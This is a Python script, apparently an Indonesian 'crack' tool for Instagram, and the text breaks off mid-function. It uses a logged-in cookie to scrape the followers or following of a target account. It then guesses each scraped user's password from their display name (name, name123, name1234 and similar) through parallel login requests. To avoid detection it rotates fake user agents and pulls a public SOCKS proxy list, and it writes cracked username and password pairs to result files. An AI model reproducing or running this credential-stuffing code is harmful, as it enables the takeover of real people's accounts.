# coding:utf-8
#/usr/bin/python
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.tree import Tree
from rich import print as prints
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
	os.mkdir('result')
except:
	pass
	
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except KeyError:
	print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()
try:
        prox2= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('.prox2.txt','w').write(prox2)
except KeyError:
        print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
BT='\033[01m'
#COLOR
BK='\033[30m' #BLACK
RD='\033[31m'   #RED
GN='\033[32m' #GREEN
OE='\033[33m'#ORANGE
BE='\033[34m'  #BLUE
PE='\033[35m'#PURPLE
CN='\033[36m'  #CYAN
LG='\033[37m' #LIGHTGREY
DG='\033[90m'  #DARKGREY
LR='\033[91m'  #LIGHTRED
LN='\033[92m'#LIGHTGREEN
YW='\033[93m'    #YELLOW
LB='\033[94m' #LIGHTBLUE
PK='\033[95m'      #PINK
LC='\033[96m' #LIGHTCYAN
BA = '\x1b[1;100m' # BELAKANG ABU ABU
USN="Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 215.0.0.27.359 Android (31/12; 540dpi; 1080x2158; samsung; SM-G991B; o1s; exynos2100; fr_FR; 337202359)"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method=[]
ugen=[]
ugen3=[]
ugen2=[]
s=requests.Session()
baru=[]
for tu in range(1000):
            a = random.choice([
            'RMX2040',
            'RMX2001',
            'RMX1827',
            'RMX2185',
            'RMX2030',
            'RMX3201',
            'RMX2195',
            'RMX2027'])
            b = random.randrange(73, 99)
            c = random.randrange(4200, 4900)
            d = random.randrange(40, 150)
            useragent = f'''Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36'''
            baru.append(useragent)
for i in range(10000):
	aa='Mozilla/5.0 (X11; Linux x86_64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='OPR/38.0.2220.41'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
for xd in range(10000):
	aa='Mozilla/5.0 (OneBrowser/3.5'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='HUAWEI Y535D-C00'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/534.30'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen3.append(uaku)
	
	a='Mozilla/5.0 (Linux; U; Android 2.3.4;'
	b='en-us;'
	c=random.randrange(4, 9)
	d='T-Mobile myTouch 36 Slide Build/GRI40)'
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.randrange(700, 999)
	n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0'
	h='Mobile Safari/533.1'
	i=random.randrange(60,99)
	j='0'
	k=random.randrange(4310,4799)
	l=random.randrange(70,150)
	m='Mobile Safari/533.1'
	uaku=(f'{a} {b} {c}; {d}{e}{f}{n}) {g} {h}{i}.{j}.{k}.{l} {m}')
	ugen2.append(uaku)
ugen5=[]
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Infinix HOT 4 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen5.append(uaku)
# CLEAR
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Mornimg"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
# BANNER
def banner():
	clear()
	au=f"""
\x1b[0;35m┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆┉࿆ ┉࿆ 
\x1b[0;33m╔̶̶═̶̶═̶̶═̶̶═̶̶═̶═̶═̶═̶̶═̶̶═̶̶═̶̶═̶═̶═̶ ❖☆͜͡✟❖✠═̶̶═̶̶═̶̶═̶̶═̶═̶̶═̶═̶̶═̶̶═̶̶═̶̶═̶═̶̶═̶╗   \x1b[0;35m┊    ┊   ┊  ┊ ┊   ┊  ┊     \x1b[0;34m⊹ 
\x1b[0;33m   ╔҉ ╾҉ ╾҉ ╾҉ ╾҉ ╾҉ ╾҉ ❖✠ৡৢ͜͡♛╼҉ ╾҉ ╾҉ ╾҉ ╾҉ ╼҉ ╗҉       \x1b[0;35m┊  \x1b[0;37m⋆\x1b[0;34m｡\x1b[0;35m┊   ┊  ┊ ┊   ┊ \x1b[0;37m⋆\x1b[0;34m｡˚. \x1b[0;37mੈ 
\x1b[0;37m         ✞ঔৣ͜͡  FAIZAL GANTENG ঔৣ͜͡✞     \x1b[0;35m┊    ┊   ┊  \x1b[0;37m✫ 
\x1b[0;33m   ╚҉ ╾҉ ╾҉ ╾҉ ╾҉ ╾҉ ╾҉ ❖✠ৡৢ͜͡♛╼҉  ╾҉ ╾҉ ╾҉ ╾҉╼҉ ╝҉       \x1b[0;35m┊ \x1b[0;37m⊹  \x1b[0;35m┊        \x1b[0;37m⋆\x1b[0;34m｡˚.\x1b[0;37m ੈ 
\x1b[0;33m╚̶̶═̶̶═̶̶═̶̶═̶̶═̶═̶═̶═̶̶═̶̶═̶̶═̶̶═̶═̶═̶ ❖☆͜͡✟❖✠═̶̶═̶̶═̶̶═̶̶═̶═̶̶═̶═̶̶═̶̶═̶̶═̶̶═̶═̶̶═̶╝   \x1b[0;37m✯ ⋆  \x1b[0;35m┊  \x1b[0;34m.  ˚               \x1b[0;37m⊹
\x1b[0;35m┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆ ┉࿆┉࿆ ┉࿆
"""
	sol().print(nel(au,style='cyan',title=f'{waktu()}'))
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Loading Harap Tunggu...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
 


def COKICEK(cookie):
	user=open('.username','r').read()
	try:
		c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
		i=c.json()["data"]["user"]
		nama=i["full_name"]
		followers=i["edge_followed_by"]["count"]
		following=i["edge_follow"]["count"]
		external.append(f'{nama}|{followers}|{following}')
	except  (ValueError,KeyError):
		wel='# Instagram Checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		time.sleep(4)
		os.remove('.kukis.log')
		os.remove('.username')
		LOGCOKI()
	return external,user


def LOGCOKI():
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            io = '[yellow][1] [green]Login Menggunakan Cookie'
            oi = nel(io, style='green')
            cetak(nel(oi, style='cyan', title='Ngentot IG'))
            loginpil=input(f"{OE}[{GN}•{OE}] {LG}Masukan Pilihan {LG}: {LG}")
            if loginpil=='1':
                wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
                wel2 = mark(wel, style='red')
                sol().print(wel2, style='yellow')
                us=input(f'{OE}[{GN}•{OE}] {LG}Masukan Username : {GN}')
                cok=input(f'{OE}[{GN}•{OE}] {LG}Masukan Cookie : {GN}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                for step in track(range(5)):
                	sleep(1)
                	step
                os.system('python3 instagram.py')
            elif loginpil == '2':
                ()
        ex,user=COKICEK(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()


def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Redmi 5A','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "261.0.0.21.111"
	VERSION_CODE = "366105508"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE


class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			os.system('clear')
			loadinglisen()
			banner()
			welcome=f'''{OE}[{GN}•{OE}] {LG}Nama Tumbal    : {LN}{nama}{N}
{OE}[{GN}•{OE}] {LG}Username       : {LN}{self.username}{N}
{OE}[{GN}•{OE}] {LG}Followers      : {LN}{followers}{N}
{OE}[{GN}•{OE}] {LG}Following      : {LN}{following}{N}
{OE}[{GN}•{OE}] {LG}STATUS SCRIPT  : {LN}GRATIS{N}'''
			print(welcome)
			io = '[yellow][[green]1[yellow]] [blue]Crack Pengikut\n[yellow][[green]2[yellow]] [blue]Crack Mengikuti\n[red][[red]0[red]] [red]Keluar Tumbal'
			oi = nel(io, style='green')
			cetak(nel(oi, style='cyan', title='Pilih Menu'))


	def BUG(self):
		bug=f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +6285888222944\n[•]'
		bug1 = nel(bug, style='cyan')
		cetak(nel(bug1, title='REPORT BUG'))
		exit()

	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))

		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))

		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()

	def Exit(self):
		kel='[?] Apakah anda yakin ingin keluar ?'
		kel1=nel(kel,style='red')
		sol().print(kel1)
		x=input(f'\n{N}[•] Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python3 instagram.py')
		elif x in ('t','T'):
			os.system('python3 instagram.py')
		else:
			self.Exit()


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
		return internal


	def idtarget(self,cookie,id):
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except KeyError:
				exit("")
			return idx

	def dumpikuti(self,cookie,api,id):
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
								
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
			except KeyError as e:
				print('')
			return internal
		

	def dumpmengikuti(self,cookie,api,id):
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
								
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f'\n{M}[!] Koneksi internet bermasalah{C}')
			except KeyError:
				print('')
			return internal
	

	def useragent(self):
		self.satu = random.randrange(73, 99)
		self.dua = random.randrange(4200, 4900)
		self.tiga = random.randrange(40, 150)
		useragent = f'''Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36'''
		return useragent

	def menupassword(self,xnx):
		os.system('clear')
		banner()
		idtar=f' [yellow][[green]•[yellow]] [cyan]TOTAL ID  : [green]{len(internal)} [/green]'
		idtar1=nel(idtar,style='')
		sol().print(idtar1)
		komb='[cyan][1] [green]Name,Name123,Name1234\n[cyan][2] [yellow]Name,Name123,Name1234,Name12345\n[cyan][3] [red]Name,Name123,Name1234,Name12345,Name123456\n[cyan][4] [purple]Password Manual'
		sol().print(nel(komb,title='[green]List Password[/green]'))
		c=input(f'{N}[•] Masukan Pilihan :{C} ')
		if c=='1':
			self.passwordkrak(xnx,c)
		elif c=='2':
			self.passwordkrak(xnx,c)
		elif c=='3':
			self.passwordkrak(xnx,c)
		elif c=='7':
			self.passwordkrak(xnx,c)
		elif c=='4':
			ui='# PASSWORD MANUAL'
			uu=mark(ui,style='')
			sol().print(uu)
			print(f'{M} Contoh sayang,anjing,bangsat')
			print('')
			zx=input(f'{N}[•] List password :{N} ')
			self.passwordkrak(xnx,c,zx)
		else:
			self.menupassword(xnx)


	def passwordkrak(self,user,o,zx=''):
		os.system('clear')
		banner()
		io=f'[yellow][[green]•[yellow]] [white]Hasil [green]OK[/green] [white]disimpan ke: [green]success/{day}.txt[/green]\n[yellow][[green]•[yellow]] [white]Hasil [yellow]CP[/yellow] [white]disimpan ke: [yellow]checkpoint/{day}.txt[/yellow]'
		oi = nel(io, style='')
		cetak(nel(oi, title='[green]CRACK DIMULAI[/green]'))
		ipku=' [yellow][[green]•[yellow]] [red]Nyalakan Mode Pesawat Jika Tidak Mendapatkan Hasil'
		ipku1=nel(ipku,style='')
		sol().print(ipku1)
		with ThreadPoolExecutor(max_workers=15) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234']
								else:
									sandi=[w,w+'123',w+'1234']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'12345']
								else:
									sandi=[w+'123',w,w+'1234',w+'12345',password.lower()]
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								else:
									sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
							elif o=="4":
								if len(zx) > 3:
									sandi = zx.replace(" ", "").split(",")
								else:
									break
							shinkai.submit(self.eksekusikrak,username,sandi)
				except:
					pass
		print('\n')
		oi='# CRACK SELESAI'
		io=mark(oi,style='cyan')
		sol().print(io)
		exit()


	def eksekusiinfo(self,user):
		ua=random.choice(ugen)
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass
		return nama,pengikut,mengikut,postingan


	def eksekusikrak(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua=random.choice([
'Mozilla/5.0 (Linux; Android 9; RMX1971 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML,like Gecko) Version/4.0 Chrome/40.0.2214.89 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/83.0.300 Mobile Chrome/77.0.3865.300 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; RMX1973 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX1971 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'])
		warna = random.choice([M, H, K, U, O,])
		sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H} OK : - {len(success)}{C}  {K} CP : - {len(checkpoint)} {N}"),sys.stdout.flush()
		try:
			for pw in pas:
				ncek=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				nip=random.choice(prox)+(prox2)
				proxs= {'http': 'socks5://'+nip}
				p = ses.get('https://www.instagram.com/web/__mid')
				ses.headers.update({
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'2d4630c5c4bb',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                     'user-agent': ua,
                     'x-csrftoken':p.cookies['csrftoken'],
                     'x-ig-app-id':'1217981644879628',
                     'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
                     'referer':'https://www.instagram.com/accounts/onetap/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})         
				data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": 'false',
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
				ncek=json.loads(respon.text)
				if 'userId' in str(ncek):
					nama,pengikut,mengikut,postingan=self.eksekusiinfo(user)
					io=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
					oi = nel(io, style='green')
					print('\n')
					cetak(nel(oi,style='',title='\r[green]•[/][white]•[/][green]•[/][green]LIVE •[/][white]•[/][green]•[/]'))
					os.popen('play-audio data/ok.mp3')
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(ncek):
